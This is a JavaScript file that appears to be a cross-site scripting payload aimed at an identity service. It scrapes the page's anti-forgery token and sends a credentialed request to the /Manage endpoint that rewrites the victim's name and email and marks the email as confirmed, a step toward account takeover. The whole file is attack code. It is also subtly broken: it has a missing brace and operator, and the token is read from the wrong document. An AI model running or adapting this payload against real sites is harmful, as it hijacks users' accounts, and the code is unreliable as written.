var firstname = "Tara";
var lastname= "MyNewLastname";
var email= "True"
var emailaddress ="tara.owens@bridewell.com"
var host = "https://identity.cybiquity.io";
var manage = "/Manage";
var token="";
var create_params = "isEmailConfirmed=" + email +"&Email="+ emailaddress+"&FirstName=" + firstname + "&LastName=" + lastname  "&__RequestVerificationToken=" + token ;

function getToken()
  fetch('/index/preferences').then(function (response) {
	return response.text();
  }).then(function (html) {
	var parser = new DOMParser();
	var doc = parser.parseFromString(html, 'text/html');
	token = document.querySelector('body > div.flex.flex-col.flex-auto.w-full.min-w-0 > div.flex.flex-col.flex-auto.relative > div > div > div > div.flex.flex-auto.overflow-hidden > div > form > input[type=hidden]:nth-child(6)').value;
	send_modify()
  }).catch(function (err) {
	xsswarn='Something went wrong.'
});

function send_modify() { 
  console.log("Modifying User..."); 
  fetch(host+manage, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body : create_params }
  ).then(function(response) {
    isdone();
  }); 
}

function isdone() { 
  console.log("Done"); 
  
}

getToken();




